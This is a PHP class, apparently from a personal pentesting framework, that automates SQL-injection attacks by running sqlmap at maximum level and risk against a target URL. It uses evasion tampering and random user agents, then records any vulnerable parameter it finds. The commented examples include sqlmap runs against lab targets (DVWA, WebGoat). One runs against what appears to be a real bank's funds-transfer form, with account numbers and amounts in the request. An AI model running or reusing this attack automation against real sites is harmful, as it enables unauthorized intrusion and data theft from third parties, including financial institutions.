<?php


class SQLI extends FI{

    /*
     //  --auth-cred="webgoat:webgoat"  //  --ignore-proxy  --proxy=http://$this->proxy_addr:$this->proxy_port
		$query = "sqlmap --batch --crawl=10 --forms --smart --hpp --threads 8 --all --answers=Y --fingerprint -v0 --keep-alive -o --parse-errors --technique=BEUSTQ --level=5 --risk=3 --tamper=charencode --random-agent  --alert='notify-send -i \"$this->dir_img/hacker.png\" \"SQLI FOUND\"'  --url '$this->http_type://$this->vhost:$this->port' ";
		
     */
    public function __construct($eth,$domain,$url,$param,$value,$methode_http) {
        parent::__construct($eth,$domain,$url,$param,$value,$methode_http);
	}



	public function sqli4pentest(){
	    $result = "";
	    $this->titre(__FUNCTION__);
	    $sql_r_1 = "SELECT param2sqli FROM URI WHERE $this->uri2where AND param2sqli IS NOT NULL";
	    if ($this->checkBD($sql_r_1) ) return  base64_decode($this->req2BD4out("param2sqli","URI",$this->uri2where));
	    else {
	        if(!empty($this->sqli2sqlmap())) {
	        $result .= $this->yesAUTH($this->port2id, "www-data", "","","", "$this->url", "", "","SQLI: $this->param", $this->ip2geoip());
	    }

	    

	    $result = base64_encode($result);
	    return base64_decode($this->req2BD4in("param2fi","URI",$this->uri2where,$result));
	    }
	}
	
	
	public function sqli2sqlmap(){
	    $result = "";
	    $this->ssTitre(__FUNCTION__);
	    // https://github.com/sqlmapproject/sqlmap/wiki/Screenshots
	    
	    // ./sqlmap.py --headers="User-Agent:$this->user2agent" --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u 'http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id
	    //  --suffix="-BR" --proxy="http://localhost:$this->proxy_port"
	    // -m BULKFILE Scan multiple targets enlisted in a given textual file
	    /*
	     sqlmap.py -u "http://127.0.0.1/dvwa/ vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ce0aa7922720f3190bf9bbff7f24c434;security=low" --forms
	     python sqlmap.py -v 2 --url=http://mysite.com/index --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2
	     --keep-alive --threads=5 --eta --batch --dbms=MySQL --os=Linux --level=5 --risk=4 --banner --is-dba --dbs --tables --technique=BEUST
	     -s /tmp/scan_report.txt --flush-session -t /tmp/scan_trace.txt --fresh-queries > /tmp/scan_out.txt
	     ./sqlmap.py -u 'http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#'
	     --cookie='PHPSESSID=0e4jfbrgd8190ig3uba7rvsip1; security=low'
	     --string='First name' --dbs --level 3 -p PHPSESSID
	     ./sqlmap.py -u http://172.16.222.200 --data="uname=admin&psw=adminuser&btnLogin=Login” –dbms=mysql –level=5
	     
	     
	     python /home/rohff/EH/TOOLS/web/sqlmap/sqlmap.py --batch -v3 --technique=B -f --level 5 --risk 3
	     --headers='$this->user2agent'
	     --cookie='PHPSESSID=ji7vgk51h1ctr073s198vht707' --alert='notify-send -i '/home/rohff/EH/IMG/hacker.png' "SQLI FOUND"'
	     --url 'https://www.agb.dz/articleonline-cpttocptvalbd.html'
	     --data 'source_account=1187601208&destination_account=10000&num_compte=1345628796&nom_b=nom_b&Prenom_b=Prenom_b&adresse_b=adresse_b&DPC_DateOper=20%2F01%2F2016&virement_R=1&Peroid=0&DPC_Fin=DPC_Fin&amount=1000&amount_2=1000&email=1&adr_mail=adr_mail&msg_mail=msg_mail&sms=1&num_sms=num_sms&message_sms=message_sms&captcha=xcjz1z&hd1187601208=1+207+398.59+++DZD&Submit=Valider'
	     -p destination_account --dbms=MySQL --time-sec 30 --tamper  "charencode"
	     
	     --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
	     --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
	     --forms
	     --auth-cred="webgoat:webgoat"
	     
	     ZAP' OR '1'='1' --
	     
	     python /home/rohff/EH/TOOLS/web/sqlmap/sqlmap.py --batch -v3 --technique=BEUST --level 5 --risk 3 --headers='User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0' --cookie='ARRAffinity=4b166b0717761e842dd4e3165a004a29360e8e525eb7d195ce8c0002a6d035a6' --alert='notify-send -i '/home/rohff/EH/IMG/hacker.png' "SQLI FOUND"' --tamper charencode --url
	     */
	    //$cookie = $this->uri_path2cookies(); --cookie='".trim($this->uri_path2cookies())."'
	    // python sqlmap.py -u http://example.com --forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3
	    
	    $query = "sqlmap --batch --answers=Y -v 0 --cookie='".trim($this->url2cookies($this->url))."' --url '$this->url' -p \"$this->param\" --keep-alive -o --parse-errors --level=5 --risk=3 --tamper=charencode --random-agent  --alert='notify-send -i \"$this->dir_img/hacker.png\" \"SQLI FOUND\"' | sed \"s/'//g\"  | egrep \"($this->param|:)\"  | grep 'parameter $this->param is vulnerable'   ";	    
	    return $this->req_ret_str($query);

	    
	}
	
	
	

}
?>
